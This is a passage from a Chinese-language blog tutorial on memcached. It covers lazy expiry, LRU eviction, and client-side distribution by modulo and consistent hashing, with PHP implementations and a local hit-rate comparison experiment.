title="惰性删除"></a>惰性删除</h5><ul><li>当某个值过期后，并没有从内存删除，因为，stats统计时，curr_item有其信息</li><li>当某个新值去占用他的位置时，当成空chunk来占用</li><li>当get值时，判断是否过期，如果过期，返回空，并且清空，curr_item就减少了</li></ul><p>这个过期，对于用户来说，访问不到，但并没有在过期的瞬间立即从内存删除</p><h5 id="LRU删除机制"><a href="#LRU删除机制" class="headerlink" title="LRU删除机制"></a>LRU删除机制</h5><p>若果以122byte大小的chunk举例，122的chunk都满了，又有新的长度为120的值要加入，要挤掉谁？</p><p>memcached用的是最近最少使用算法来挤掉被占用的chunk</p><p>原理：当某个单元被请求时，维护一个计数器，通过计数器来判断最近谁最少被使用，就把谁踢出。</p><h1 id="memcached分布式"><a href="#memcached分布式" class="headerlink" title="memcached分布式"></a>memcached分布式</h1><p>memcached虽然称为“分布式”缓存服务器，但服务器端并没有“分布式”功能。Memcache集群主机不能够相互通信传输数据，它的“分布式”是基于客户端的程序逻辑算法进一步实现的</p><p><img src="分布式.png" alt=""></p><h2 id="分布式算法之取模算法"><a href="#分布式算法之取模算法" class="headerlink" title="分布式算法之取模算法"></a>分布式算法之取模算法</h2><p>最容易想到的算法是取模算法，即N个节点要从0-&gt;N-1编号<br>key对N取模，余i,则key落在第i台服务器上</p><p><img src="取模.png" alt=""></p><h3 id="代码实现取模算法"><a href="#代码实现取模算法" class="headerlink" title="代码实现取模算法"></a>代码实现取模算法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 14:04</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface <span class="built_in">hash</span>&#123;</span><br><span class="line"></span><br><span class="line">    //将key的字符串转换成为整数</span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface distribution&#123;</span><br><span class="line">    //查找键值所对应的服务器node的结点位置</span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ModClass implements <span class="built_in">hash</span>,distribution&#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_nodes</span>=[];//节点数组</span><br><span class="line">    protected <span class="variable">$_count</span>=0;//结点的个数</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> sprintf(<span class="string">"%u"</span>,crc32(<span class="variable">$str</span>));//把字符串转成32位符号整数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$location</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$key</span>)%<span class="variable">$this</span>-&gt;_count;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;_nodes[<span class="variable">$location</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> addNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes))&#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;_nodes[] =<span class="variable">$node</span>;</span><br><span class="line">        <span class="variable">$this</span>-&gt;_count+=1;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> delNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes))&#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="variable">$node</span>,<span class="variable">$this</span>-&gt;_nodes);</span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$this</span>-&gt;_count-=1;</span><br><span class="line">        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$mod</span> = new ModClass();</span><br><span class="line"><span class="variable">$mod</span>-&gt;addNode(<span class="string">'a'</span>);</span><br><span class="line"><span class="variable">$mod</span>-&gt;addNode(<span class="string">'b'</span>);</span><br><span class="line"><span class="variable">$mod</span>-&gt;addNode(<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"当前的键计算的hash落点是"</span>.<span class="variable">$mod</span>-&gt;_hash(<span class="string">'title'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$mod</span>-&gt;lookup(<span class="string">'title'</span>);</span><br></pre></td></tr></table></figure><h3 id="取模算法的缺陷"><a href="#取模算法的缺陷" class="headerlink" title="取模算法的缺陷"></a>取模算法的缺陷</h3><p><img src="缺陷.png" alt=""></p><h2 id="分布式算法之致性哈希算法"><a href="#分布式算法之致性哈希算法" class="headerlink" title="分布式算法之致性哈希算法"></a>分布式算法之致性哈希算法</h2><p>一致性hash算法除了计算key的hash值外，还会计算每个server对应的hash值，然后将这些hash值映射到一个有限的值域上（比如0~2^32）。通过寻找hash值大于hash(key)的最小server作为存储该key数据的目标server。如果找不到，则直接把具有最小hash值的server作为目标server。</p><p>为了方便理解，可以把这个有限值域理解成一个环，值顺时针递增。</p><p><img src="一致性哈希.png" alt=""></p><h3 id="某节点down后的变化情况-对其他节点的影响"><a href="#某节点down后的变化情况-对其他节点的影响" class="headerlink" title="某节点down后的变化情况,对其他节点的影响"></a>某节点down后的变化情况,对其他节点的影响</h3><p><img src="一致性哈希对其他节点的影响.png" alt=""></p><h3 id="一致性哈希算法的改进–增加虚拟结点"><a href="#一致性哈希算法的改进–增加虚拟结点" class="headerlink" title="一致性哈希算法的改进–增加虚拟结点"></a>一致性哈希算法的改进–增加虚拟结点</h3><p><img src="虚拟结点.png" alt=""></p><h3 id="代码实现一般一致性哈希算法"><a href="#代码实现一般一致性哈希算法" class="headerlink" title="代码实现一般一致性哈希算法"></a>代码实现一般一致性哈希算法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   </span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">hash</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_hash</span><span class="params">($str)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">distribution</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lookup</span><span class="params">($key)</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Consistent</span> <span class="keyword">implements</span> <span class="title">hash</span>,<span class="title">distribution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $_nodes=[];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对key进行转换</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_hash</span><span class="params">($str)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sprintf(<span class="string">"%u"</span>,crc32($str));<span class="comment">//把字符串转成32位符号整数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算key所操作的node服务器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">lookup</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $point = <span class="keyword">$this</span>-&gt;_hash($key);</span><br><span class="line">        $node = current(<span class="keyword">$this</span>-&gt;_nodes);<span class="comment">//先取圆环上最小的一个结点，当成结果</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_nodes <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            <span class="keyword">if</span> ($point&lt;=$k)&#123;</span><br><span class="line">                $node=$v;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $node;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//增加服务器</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addNode</span><span class="params">($node)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_nodes[<span class="keyword">$this</span>-&gt;_hash($node)] =$node;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sortNode();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对node进行排序，很重要的操作</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sortNode</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ksort(<span class="keyword">$this</span>-&gt;_nodes,SORT_REGULAR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNodes</span><span class="params">()</span></span>&#123;</span><br><span class="line">        print_r(<span class="keyword">$this</span>-&gt;_nodes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$consistentObj = <span class="keyword">new</span> Consistent();</span><br><span class="line"></span><br><span class="line">$consistentObj-&gt;addNode(<span class="string">'a'</span>);</span><br><span class="line">$consistentObj-&gt;addNode(<span class="string">'b'</span>);</span><br><span class="line">$consistentObj-&gt;addNode(<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"所有服务器的结点如下"</span>.$consistentObj-&gt;getNodes();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"当前的键计算的hash落点是"</span>.$consistentObj-&gt;_hash(<span class="string">'name'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $consistentObj-&gt;lookup(<span class="string">'name'</span>);</span><br></pre></td></tr></table></figure><h3 id="代码实现支持虚拟节点的一致性哈希算法"><a href="#代码实现支持虚拟节点的一致性哈希算法" class="headerlink" title="代码实现支持虚拟节点的一致性哈希算法"></a>代码实现支持虚拟节点的一致性哈希算法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">interface <span class="built_in">hash</span>&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface distribution&#123;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Consistent implements <span class="built_in">hash</span>,distribution &#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_position</span>=[];</span><br><span class="line">    protected <span class="variable">$_nodes</span>=[];</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$_mul</span> =64;//每个节点对应64个虚节点</span><br><span class="line"></span><br><span class="line">    //对key进行转换</span><br><span class="line">    public <span class="keyword">function</span> _hash(<span class="variable">$str</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> sprintf(<span class="string">"%u"</span>,crc32(<span class="variable">$str</span>));//把字符串转成32位符号整数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //计算key所操作的node服务器</span><br><span class="line">    public <span class="keyword">function</span> lookup(<span class="variable">$key</span>)&#123;</span><br><span class="line">        <span class="variable">$point</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$key</span>);</span><br><span class="line">        <span class="variable">$node</span> = current(<span class="variable">$this</span>-&gt;_position);//先取圆环上最小的一个结点，当成结果</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;_position as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$point</span>&lt;=<span class="variable">$k</span>)&#123;</span><br><span class="line">                <span class="variable">$node</span>=<span class="variable">$v</span>;</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        reset(<span class="variable">$this</span>-&gt;_position);</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$node</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    //增加服务器</span><br><span class="line">    public <span class="keyword">function</span> addNode(<span class="variable">$node</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (isset(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]))&#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;<span class="variable">$this</span>-&gt;_mul;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="variable">$pos</span> = <span class="variable">$this</span>-&gt;_hash(<span class="variable">$node</span>.<span class="string">'-'</span>.<span class="variable">$i</span>);</span><br><span class="line">            <span class="variable">$this</span>-&gt;_position[<span class="variable">$pos</span>]=<span class="variable">$node</span>;</span><br><span class="line">            <span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>][]=<span class="variable">$pos</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;_sortPos();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //对node进行排序，很重要的操作</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">_sortPos</span></span>()&#123;</span><br><span class="line">        ksort(<span class="variable">$this</span>-&gt;_position,SORT_REGULAR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> delNode(<span class="variable">$node</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]))&#123;</span><br><span class="line">            <span class="built_in">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        foreach (<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>] as <span class="variable">$k</span>)&#123;</span><br><span class="line">            <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_position[<span class="variable">$k</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">unset</span>(<span class="variable">$this</span>-&gt;_nodes[<span class="variable">$node</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">getNodes</span></span>()&#123;</span><br><span class="line">        print_r(<span class="variable">$this</span>-&gt;_position);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$consistentObj</span> = new Consistent();</span><br><span class="line"></span><br><span class="line"><span class="variable">$consistentObj</span>-&gt;addNode(<span class="string">'a'</span>);</span><br><span class="line"><span class="variable">$consistentObj</span>-&gt;addNode(<span class="string">'b'</span>);</span><br><span class="line"><span class="variable">$consistentObj</span>-&gt;addNode(<span class="string">'c'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"所有服务器的结点如下"</span>.<span class="variable">$consistentObj</span>-&gt;getNodes();</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"当前的键计算的hash落点是"</span>.<span class="variable">$consistentObj</span>-&gt;_hash(<span class="string">'name'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$consistentObj</span>-&gt;lookup(<span class="string">'name'</span>);</span><br></pre></td></tr></table></figure><h1 id="取模以及一致性哈希命中率对比"><a href="#取模以及一致性哈希命中率对比" class="headerlink" title="取模以及一致性哈希命中率对比"></a>取模以及一致性哈希命中率对比</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>开启五个memcached进程<br>以windows为例：cmd下多开窗口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memcached.exe -m 4 -p 11211 -vvv </span><br><span class="line">memcached.exe -m 4 -p 11212 -vvv </span><br><span class="line">memcached.exe -m 4 -p 11213 -vvv </span><br><span class="line">memcached.exe -m 4 -p 11214 -vvv </span><br><span class="line">memcached.exe -m 4 -p 11215 -vvv</span><br></pre></td></tr></table></figure></p><p>以下是源码文件：</p><ul><li>calStats.php 统计命中率</li><li>config.php 结点配置</li><li>delNodeReqquest.php ，模拟down一个服务器结点获取数据的过程</li><li>Distribute.php 取模和一致性哈希算法的实现</li><li>index.html 图表页面</li><li>InitData.php 根据所配置的算法初始化memmcached数据</li></ul><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="初始化数据"><a href="#初始化数据" class="headerlink" title="初始化数据"></a>初始化数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php InitData.php</span><br></pre></td></tr></table></figure><p>初始化数据后</p><h3 id="开启服务，访问index-html"><a href="#开启服务，访问index-html" class="headerlink" title="开启服务，访问index.html"></a>开启服务，访问index.html</h3><p>在源码目录下使用php内置web服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:8000</span><br></pre></td></tr></table></figure></p><p>浏览器页面访问localhost:8000<br>就可以看到图表曲线在跳动</p><h3 id="模拟down一个结点，访问数据"><a href="#模拟down一个结点，访问数据" class="headerlink" title="模拟down一个结点，访问数据"></a>模拟down一个结点，访问数据</h3><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><h2 id="取模算法"><a href="#取模算法" class="headerlink" title="取模算法"></a>取模算法</h2><p> <img src="取模效率.png" alt=""></p><h3 id="一致性哈希效率"><a href="#一致性哈希效率" class="headerlink" title="一致性哈希效率"></a>一致性哈希效率</h3><p> <img src="一致性哈希效率.png" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="总结.png" alt=""></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p>calStats.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 14:32</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 统计各节点的平均命中率</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">require (<span class="string">'./config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$mem</span> = new memcache();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_gets</span> =0;</span><br><span class="line"><span class="variable">$_hits</span> =0;</span><br><span class="line"></span><br><span class="line">foreach (<span class="variable">$_mem</span> as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="variable">$mem</span>-&gt;connect(<span class="variable">$v</span>[<span class="string">'host'</span>],<span class="variable">$v</span>[<span class="string">'port'</span>],2);</span><br><span class="line">    <span class="variable">$stats</span> = <span class="variable">$mem</span>-&gt;getStats();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_gets</span> += <span class="variable">$stats</span>[<span class="string">'cmd_get'</span>];</span><br><span class="line">    <span class="variable">$_hits</span> += <span class="variable">$stats</span>[<span class="string">'get_hits'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$rate</span> =1;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_gets</span>&gt;0)&#123;</span><br><span class="line">    <span class="variable">$rate</span> = <span class="variable">$_hits</span>/<span class="variable">$_gets</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$rate</span>;</span><br></pre></td></tr></table></figure></p><p>config.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: seven</span><br><span class="line"> * Date: 2018/9/8</span><br><span class="line"> * Time: 13:46</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//配置文件，配置memcahced的结点信息</span><br><span class="line"><span class="variable">$_mem</span> = [];</span><br><span class="line"><span class="variable">$_mem</span>[<span class="string">'A'</span>] = [<span class="string">'host'</span>=&gt;<span class="string">'127.0.0.1'</span>,<span class="string">'port'</span>=&gt;<span class="string">'11211'</span>];</span><br><span class="line"><span class="variable">$_mem</span>[<span class="string">'B'</span>] = [<span class="string">'host'</span>=&gt;<span class="string">'127.0.0.1'</span>,<span class="string">'port'</span>=&gt;<span class="string">'11212'</span>];</span><br><span class="line"><span class="variable">$_mem</span>[<span class="string">'C'</span>] = [<span class="string">'host'</span>=&gt;<span class="string">'127.0.0.1'</span>,<span class="string">'port'</span>=&gt;<span class="string">'11213'</span>];</span><br><span class="line"><span class="variable">$_mem</span>[<span class="string">'D'</span>] = [<span class="string">'host'</span>=&gt;<span class="string">'127.0.0.1'</span>,<span class="string">'port'</span>=&gt;<span class="string">'11214'</span>];</span><br><span class="line"><span class="variable">$_mem</span>[<span class="string">'E'</span>] = [<span class="string">'host'</span>=&gt;<span class="string">'127.0.0.1'</span>,<span class="string">'port'</span>=&gt;<span class="string">'11215'</span>];</span><br><span class="line"></span><br><span class="line">//分配策略</span><br><span class="line"><span class="variable">$_dis</span> = <span class="string">'Consistent'</span>;//Consistent;</span><br></pre></td></tr></table></figure></p><p>delNodeReqquest.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 